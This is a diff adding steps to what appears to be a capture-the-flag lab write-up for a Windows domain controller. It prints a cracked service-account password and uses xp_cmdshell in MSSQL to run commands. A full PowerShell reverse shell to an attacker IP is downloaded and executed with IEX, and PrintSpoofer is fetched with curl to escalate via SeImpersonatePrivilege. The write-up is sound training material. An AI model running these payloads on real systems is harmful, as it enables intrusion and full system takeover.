@@ -198,7 +198,93 @@ SMB         10.10.138.186   445    DC               [+] ustoun.local\SVC-Kerb:s*
 /usr/share/doc/python3-impacket/examples/mssqlclient.py
 ```
 
+## mssqlclient
+
 ```#!/bin/sh
 ┌──(alienum㉿kali)-[~]
-└─$ python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py ustoun.local/svc-kerb:s******n@10.10.138.186
+└─$ python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py ustoun.local/svc-kerb:superman@10.10.197.105
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC): Line 1: Changed database context to 'master'.
+[*] INFO(DC): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
+[!] Press help for extra shell commands
+SQL> xp_cmdshell "whoami"
+
+output                                                                             
+
+--------------------------------------------------------------------------------   
+
+dc01\svc-kerb
+```
+
+## Uploading the reverse shell
+
+- Create the `shell.ps1` with the below contents
+
+```powershell
+$client = New-Object System.Net.Sockets.TCPClient("10.8.28.219",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+## Python Server
+
+```sh
+sudo  python3 -m http.server 80
+```
+
+## Listener
+
+```sh
+sudo nc -lvnp 443
+```
+
+## mssqlclient | Download
+```sh
+xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.8.28.219/shell.ps1\");""
+```
+
+## Privilege Escalation
+
+- Run the command `whoami /priv`
+
+The `/priv` represents the Privileges that the current user have
+
+```sh
+# whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeMachineAccountPrivilege     Add workstations to domain                Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+#
+```
+
+## SetImpersonatePrivilege
+
+After a google search i found that the `PrintSpoofer` tool can exploit the `SetImpersonatePrivilege`
+Check here the original blog : [printspoofer-abusing-impersonate-privileges](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
+
+Download the exe here [PrintSpoofer.exe](https://github.com/dievus/printspoofer)
+
+## Download the printspoofer
+```sh
+curl http://10.8.28.219:81/PrintSpoofer.exe -o C:\temp\printspoofer.exe
+```
+
+## Run the script
+```sh
+printspoofer.exe -i -c powershell
 ```
